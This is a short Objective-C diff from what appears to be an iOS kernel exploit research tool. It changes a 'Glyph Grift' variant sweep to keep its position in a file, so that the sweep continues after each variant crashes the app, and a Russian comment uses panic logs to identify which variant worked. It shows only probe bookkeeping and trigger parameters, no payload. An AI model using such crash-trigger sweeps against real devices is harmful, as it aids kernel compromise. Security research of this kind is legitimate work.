@@ -795,10 +795,16 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
 
 + (NSString *)glyphGriftProbeReport {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5i: Glyph Grift variant sweep (one per run) ===\n"];
+    [r appendString:@"\n=== R5i: Glyph Grift variant sweep (one per run, NO KRW needed) ===\n"];
 
-    // Static cursor — one variant per invocation so a crash identifies itself.
-    static int gGlyphIdx = 0;
+    // Disk-backed cursor — survives app crash (each variant kills the process).
+    NSString *idxPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-idx.txt"];
+    int gGlyphIdx = 0;
+    {
+        NSString *s = [NSString stringWithContentsOfFile:idxPath encoding:NSUTF8StringEncoding error:nil];
+        gGlyphIdx = s.intValue;
+        if (gGlyphIdx < 0) gGlyphIdx = 0;
+    }
     const char *names[8] = { "g1", "g2", "g3", "g4", "g5", "g6", "g7", "g8" };
     const char *desc[8] = {
         "tx32000 dx31 n9  STACK (width_px 992)",
@@ -811,7 +817,10 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
         "tx32000 dx16 n9  STACK (small buffer)",
     };
     int idx = gGlyphIdx % 8;
-    gGlyphIdx++;
+    {
+        NSString *next = [NSString stringWithFormat:@"%d", gGlyphIdx + 1];
+        [next writeToFile:idxPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    }
 
     scopeNote(r, [NSString stringWithFormat:@"  VARIANT [%d] %s : %s", idx, names[idx], desc[idx]]);
     scopeNote(r, @"  !!! если паника — panic log + эта строка = какой вариант сработал !!!");
